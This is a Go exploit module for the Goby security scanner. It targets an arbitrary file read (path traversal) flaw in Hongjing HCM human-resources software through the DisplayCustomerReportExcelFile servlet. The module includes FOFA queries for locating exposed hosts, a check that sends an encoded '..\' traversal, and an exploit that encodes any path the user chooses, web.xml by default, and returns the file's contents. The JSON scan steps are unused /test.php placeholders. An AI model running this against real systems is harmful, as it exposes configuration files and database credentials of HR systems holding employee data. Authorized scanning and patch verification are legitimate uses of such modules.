package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HJSOFT-HCM /servlet/DisplayCustomerReportExcelFile Arbitrary File Read Vulnerability",
    "Description": "<p>Hongjing HCM system is a human resource management software mainly used for enterprise management of human resources, salary management, employee performance evaluation, and other aspects.</p><p>There is a file read vulnerability in Hongjing HCM, which allows attackers to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in the website being in an extremely insecure state.</p>",
    "Product": "HJSoft-HCM",
    "Homepage": "http://www.hjsoft.com.cn/",
    "DisclosureDate": "2023-09-01",
    "PostTime": "2024-03-20",
    "Author": "_白",
    "FofaQuery": "body=\"/hjaxmanage.js\" || banner=\"/templates/index/hcmlogon.jsp\" || body=\"/templates/index/hrlogon.do\"",
    "GobyQuery": "body=\"/hjaxmanage.js\" || banner=\"/templates/index/hcmlogon.jsp\" || body=\"/templates/index/hrlogon.do\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely insecure state.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix patch. Please keep an eye on the updates: <a href=\"http://www.hjsoft.com.cn/\">http://www.hjsoft.com.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "read",
            "show": ""
        },
        {
            "name": "path",
            "type": "input",
            "value": "..\\webapps\\hrms\\WEB-INF\\web.xml",
            "show": "attackType=read"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2023"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "宏景 HCM /servlet/DisplayCustomerReportExcelFile 任意文件读取漏洞",
            "Product": "HJSOFT-HCM",
            "Description": "<p>宏景HCM系统是一款人力资源管理软件,主要用于企业管理人力资源、薪酬管理、员工绩效评估等方面。<br></p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">宏景HCM存在文件读取漏洞，</span>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">厂商已发布了漏洞修复补丁，请及时关注更新： <a href=\"http://www.hjsoft.com.cn/\">http://www.hjsoft.com.cn/</a></span><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "HJSOFT-HCM /servlet/DisplayCustomerReportExcelFile Arbitrary File Read Vulnerability",
            "Product": "HJSoft-HCM",
            "Description": "<p>Hongjing HCM system is a human resource management software mainly used for enterprise management of human resources, salary management, employee performance evaluation, and other aspects.</p><p>There is a file read vulnerability in Hongjing HCM, which allows attackers to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in the website being in an extremely insecure state.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix patch. Please keep an eye on the updates: <a href=\"http://www.hjsoft.com.cn/\">http://www.hjsoft.com.cn/</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in an extremely insecure state.</span><br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10967"
}`
	sendPayloadFlagtxjCLHX := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		paylaodConfig := httpclient.NewGetRequestConfig("/servlet/DisplayCustomerReportExcelFile?filename=" + payload)
		paylaodConfig.VerifyTls = false
		paylaodConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, paylaodConfig)
	}

	checkREADFlagtxjCLHX := func(hostInfo *httpclient.FixUrl) (bool, error) {
		resp, err := sendPayloadFlagtxjCLHX(hostInfo, "~2e~2e~5c")
		if resp == nil && err != nil {
			return false, err
		} else {
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "EDA_STREAMBOUNDARYEDA_STREAMBOUNDARY") {
				return true, err
			} else {
				return false, err
			}
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			success, _ := checkREADFlagtxjCLHX(hostInfo)
			if success {
				stepLogs.VulURL = hostInfo.FixedHostInfo + "/servlet/DisplayCustomerReportExcelFile?filename="
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "read" {
				xpath := goutils.B2S(stepLogs.Params["path"])
				encpath := strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(xpath, ".", "~2e"), "\\", "~5c"), "-", "~2d")
				if resp, _ := sendPayloadFlagtxjCLHX(expResult.HostInfo, encpath); resp.StatusCode == 200 {
					expResult.Success = true
					expResult.OutputType = "html"
					expResult.Output = resp.Utf8Html
				} else if resp.StatusCode == 500 && strings.Contains(resp.Utf8Html, "输入网页不存在,请检查网页地址是否正确!") {
					expResult.Success = false
					expResult.Output = "文件路径不存在或漏洞不存在！"
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败！"
				}
			}
			return expResult
		},
	))
}
